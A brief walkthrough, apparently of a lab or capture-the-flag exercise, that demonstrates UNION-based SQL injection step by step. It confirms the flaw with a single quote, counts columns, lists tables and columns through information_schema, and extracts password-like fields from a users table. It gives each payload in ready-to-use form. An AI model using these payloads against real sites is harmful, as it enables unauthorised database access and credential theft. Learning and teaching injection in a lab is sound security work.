first of all we test that the site is vulnerable to sql injuctions by typing a single quote in the input

assuming the server already has a select statement in place, if we want to injuct our own select statement, we need to use UNION. 
using UNION to execute two select statements means they both must have the same number of columns, 
this confirms that the number of columns is 2 : -1 order by 2 --

now lets injuct this statement to get the names of tables and table schemas to which each table belongs:
-1 AND false union SELECT table_name , table_schema  FROM information_schema.columns 

now lets display the column names of each table
-1 AND false union SELECT column_name , table_schema  FROM information_schema.columns 

knowing the names of of colums we want to display and the name of the table, and table schema they belong to, we can use this statement

for  Member_Sql_Injection/users :
-1 UNION ALL SELECT countersign, Commentaire FROM Member_Sql_Injection.users;
